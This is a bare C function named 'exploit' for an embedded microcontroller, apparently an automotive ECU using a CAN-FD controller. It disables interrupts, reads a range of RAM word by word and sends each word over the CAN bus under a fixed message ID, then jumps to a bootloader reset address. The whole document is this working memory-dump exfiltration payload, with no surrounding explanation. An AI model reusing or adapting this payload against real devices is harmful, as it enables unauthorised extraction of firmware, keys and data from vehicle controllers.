void exploit() {
    unsigned char* volatile RSCFDnCFDTMSTSp = 0xffd202d0;
    unsigned int* volatile RSCFDnCFDTMIDp  = 0xffd24000;
    unsigned int* volatile RSCFDnCFDTMDF0_p = 0xffd2400c;
    unsigned int* volatile RSCFDnCFDTMDF1_p = 0xffd24010;
    unsigned int* volatile RSCFDnCFDTMPTRp = 0xffd24004;
    unsigned int* volatile RSCFDnCFDTMFDCTRp = 0xffd24008;
    unsigned char* volatile RSCFDnCFDTMCp = 0xffd20250;

    asm("di");

    int *addr = (int *)0xff1ff000;
    while (addr < (int *)0xff209000) {
        int i = 0x10;

        if ((*(RSCFDnCFDTMSTSp + i) & 0b110) != 0) {
            continue;
        }

        *(RSCFDnCFDTMPTRp + 8 * i) = 0b1000 << 28;
        *(RSCFDnCFDTMIDp + 8 * i) = 0x7a9;
        *(RSCFDnCFDTMDF0_p + 8 * i) = ((int)addr << 8) | 0x07;
        *(RSCFDnCFDTMDF1_p + 8 * i) = *addr;
        *(RSCFDnCFDTMFDCTRp + 8 * i) = 0x0;
        *(RSCFDnCFDTMCp + i) |= 0x1;

        while ((*(RSCFDnCFDTMSTSp + i) & 0b110) == 0) {
        }

        *(RSCFDnCFDTMSTSp + i) = *(RSCFDnCFDTMSTSp + i) & 0xf9;
        addr++;
    }

    void (*bl_reset)(void) = (void (*)(void))0x0000157e;
    bl_reset();
}
